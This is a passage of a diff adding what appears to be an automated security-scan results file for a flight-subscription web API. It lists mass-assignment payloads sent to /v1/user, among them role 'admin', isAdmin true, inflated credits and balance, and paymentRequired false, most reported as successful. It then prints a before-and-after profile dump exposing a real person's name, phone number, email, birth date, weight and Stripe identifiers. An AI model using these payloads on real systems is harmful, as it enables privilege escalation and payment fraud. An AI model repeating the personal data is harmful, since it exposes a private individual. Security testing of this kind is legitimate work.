that exceeds every expectation.</div>\n        </div>\n      \n    </div>\n  </div>\n</body>\n</html>\n\n\n\n\n    <!--\n        Client-side Templates\n        ========================\n\n        HTML templates are important prerequisites of modern, rich client applications.\n        To work their magic, frameworks like React, Vue.js, Angular, Ember, and Backbone\n        require that you load these templates client-side.\n\n        By default, your Gruntfile is configured to automatically load and precompile\n        client-side JST templates in your `assets/templates` folder, then\n        include them here automatically (between TEMPLATES and TEMPLATES END).\n\n        To customize this behavior to fit your needs, just edit `tasks/pipeline.js`.\n        For example, here are a few things you could do:\n\n            + Import templates from other directories\n            + Use a different view engine (handlebars, dust, pug/jade, etc.)\n            + Internationalize your client-side templates using a server-side\n              stringfile before they're served.\n    -->\n\n    <!--TEMPLATES-->\n    <!--TEMPLATES END-->\n\n\n    <!--\n        Server-side View Locals\n        ========================\n\n        Sometimes, it's convenient to get access to your server-side view locals from\n        client-side JavaScript.  This can improve page load times, remove the need for\n        extra AJAX requests, and make your client-side code easier to understand and\n        to maintain.  Sails provides a simple mechanism for accessing dynamic view\n        locals: the \"exposeLocalsToBrowser()\" view partial.\n\n        For more information on using this built-in feature, see:\n        https://sailsjs.com/docs/concepts/views/locals#?escaping-untrusted-data-using-exposelocalstobrowser\n\n    -->\n\n\n    <!--\n\n      Client-side Javascript\n      ========================\n\n      You can always bring in JS files manually with `script` tags, or asynchronously\n      on the client using a solution like AMD (RequireJS).  Or, if you like, you can\n      take advantage of Sails' conventional asset pipeline (boilerplate Gruntfile).\n\n      By default, files in your `assets/js` folder are included here\n      automatically (between SCRIPTS and SCRIPTS END).  Both JavaScript (.js) and\n      CoffeeScript (.coffee) are supported. In production, your scripts will be minified\n      and concatenated into a single file.\n\n      To customize any part of the built-in behavior, just edit `tasks/pipeline.js`.\n      For example, here are a few things you could do:\n\n          + Change the order of your scripts\n          + Import scripts from other directories\n          + Use a different preprocessor, like TypeScript\n\n    -->\n\n  \n  </body>\n</html>\n"
+      }
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "credits": 9999
+      },
+      "details": "Successfully manipulated credits"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "balance": 9999
+      },
+      "details": "Successfully manipulated balance"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "referralCount": 100
+      },
+      "details": "Successfully manipulated referralCount"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "referrals": 100
+      },
+      "details": "Successfully manipulated referrals"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "subscriptionTier": "premium"
+      },
+      "details": "Successfully manipulated subscriptionTier"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "membership": "vip"
+      },
+      "details": "Successfully manipulated membership"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "role": "admin"
+      },
+      "details": "Successfully manipulated role"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "isAdmin": true
+      },
+      "details": "Successfully manipulated isAdmin"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "isPremium": true
+      },
+      "details": "Successfully manipulated isPremium"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "freeFlights": 10
+      },
+      "details": "Successfully manipulated freeFlights"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "flightCredits": 100
+      },
+      "details": "Successfully manipulated flightCredits"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "accessLevel": 99
+      },
+      "details": "Successfully manipulated accessLevel"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "accountType": "corporate"
+      },
+      "details": "Successfully manipulated accountType"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "tier": "premium"
+      },
+      "details": "Successfully manipulated tier"
+    },
+    {
+      "type": "CRITICAL - User Field Manipulation",
+      "severity": "CRITICAL",
+      "cvss": 9.1,
+      "endpoint": "/v1/user",
+      "payload": {
+        "level": "unlimited"
+      },
+      "details": "Successfully manipulated level"
+    },
+    {
+      "type": "CRITICAL - Payment Bypass",
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "endpoint": "/v1/user",
+      "payload": {
+        "paymentRequired": false
+      }
+    },
+    {
+      "type": "CRITICAL - Payment Bypass",
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "endpoint": "/v1/user",
+      "payload": {
+        "subscriptionActive": true
+      }
+    },
+    {
+      "type": "CRITICAL - Payment Bypass",
+      "severity": "CRITICAL",
+      "cvss": 9.8,
+      "endpoint": "/v1/user",
+      "payload": {
+        "isPaying": false
+      }
+    },
+    {
+      "type": "CRITICAL - Data Changed",
+      "severity": "CRITICAL",
+      "details": "User Profile was modified by our tests",
+      "before": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363555375,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1711138021682,
+            "updatedAt": 1713541686134,
+            "id": 456,
+            "costToUse": 149500,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 1,
+              "name": "base",
+              "priorityLevel": 1,
+              "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1711138021682,
+            "updatedAt": 1746829193471,
+            "id": 896,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 2,
+              "name": "base_free",
+              "priorityLevel": 1,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1742705161901,
+            "updatedAt": 1742705161902,
+            "id": 5484,
+            "costToUse": 149500,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 1,
+              "name": "base",
+              "priorityLevel": 1,
+              "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1746886000226,
+            "updatedAt": 1746886000226,
+            "id": 5978,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 2,
+              "name": "base_free",
+              "priorityLevel": 1,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      },
+      "after": {
+        "sweepstakesEntries": [],
+        "createdAt": 1710825847458,
+        "updatedAt": 1762363653829,
+        "id": 20254,
+        "phoneNumber": "+13035234453",
+        "email": "attacker@example.com",
+        "confirmedEmail": "sameer.s.chopra@gmail.com",
+        "priorityScore": 1931577847,
+        "firstName": "Sameer",
+        "middleName": "",
+        "lastName": "Chopra",
+        "dateOfBirth": "1991-08-14",
+        "weight": 140,
+        "gender": "Male",
+        "isCarbonOffsetEnrolled": true,
+        "successfulReferralCount": 0,
+        "lastFlightPurchase": null,
+        "eulaVersion": null,
+        "isEulaAccepted": false,
+        "hasStripePaymentDetails": false,
+        "stripeCustomerId": "cus_PlS5D89fzdDYgF",
+        "stripeSubscriptionId": null,
+        "stripeSubscriptionPaymentIntentId": null,
+        "stripeFlightPurchasePaymentIntentId": null,
+        "subscriptionStartDate": 1760700980000,
+        "subscriptionRenewalDate": 1830297600000,
+        "lastActivityAt": 1762307406434,
+        "referralKey": "nBBMuS",
+        "smsOptIn": true,
+        "emailOptIn": true,
+        "trackingOptIn": false,
+        "isFlightNotificationEnabled": true,
+        "isAllFlightsNotificationEnabled": true,
+        "androidAppVersion": "1.1.40",
+        "androidBuildNumber": 183,
+        "iosAppVersion": "1.1.40",
+        "iosBuildNumber": 219,
+        "abandonedRegReminderSent": false,
+        "license": {
+          "createdAt": 1760700980000,
+          "updatedAt": 1760746044256,
+          "id": 3050,
+          "uuid": "b7d49fc6-cd3e-4560-b100-08edf4d3b922",
+          "expiresAt": 1830297600000,
+          "isAssigned": true,
+          "stripeSubscriptionId": null,
+          "preferredStripeCreationDate": 1798761600000,
+          "membershipTier": {
+            "id": 2,
+            "name": "cabin+",
+            "priorityLevel": 2
+          },
+          "account": null,
+          "user": 20254,
+          "licenseRefund": null
+        },
+        "account": null,
+        "subscriptionStatus": 3,
+        "waitlistUpgrades": [
+          {
+            "createdAt": 1711138021682,
+            "updatedAt": 1713541686134,
+            "id": 456,
+            "costToUse": 149500,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 1,
+              "name": "base",
+              "priorityLevel": 1,
+              "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1711138021682,
+            "updatedAt": 1746829193471,
+            "id": 896,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1RMzGkBkrWmvysmuux7aAe55",
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 2,
+              "name": "base_free",
+              "priorityLevel": 1,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1742705161901,
+            "updatedAt": 1742705161902,
+            "id": 5484,
+            "costToUse": 149500,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 1,
+              "name": "base",
+              "priorityLevel": 1,
+              "stripePriceId": "price_1QDDF5BkrWmvysmujrEHAbSh"
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1746886000226,
+            "updatedAt": 1746886000226,
+            "id": 5978,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": null,
+            "usedOn": null,
+            "priorityUpgradeTier": {
+              "id": 2,
+              "name": "base_free",
+              "priorityLevel": 1,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          },
+          {
+            "createdAt": 1761856740189,
+            "updatedAt": 1761864095757,
+            "id": 7756,
+            "costToUse": 0,
+            "customAmount": null,
+            "stripePaymentIntentId": "in_1SO2csBkrWmvysmuy0WfLjp3",
+            "usedOn": 1761864095757,
+            "priorityUpgradeTier": {
+              "id": 4,
+              "name": "cabin+_free",
+              "priorityLevel": 2,
+              "stripePriceId": null
+            },
+            "user": 20254,
+            "expiresOn": -1
+          }
+        ],
+        "termsStatus": {
+          "TermsAndConditions": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451030
+          },
+          "PrivacyPolicy": {
+            "requiresAcceptance": false,
+            "currentVersion": "1.1",
+            "lastAcceptedVersion": "1.1",
+            "lastAcceptedDate": 1756848451047
+          }
+        }
+      }
+    }
+  ]
+}
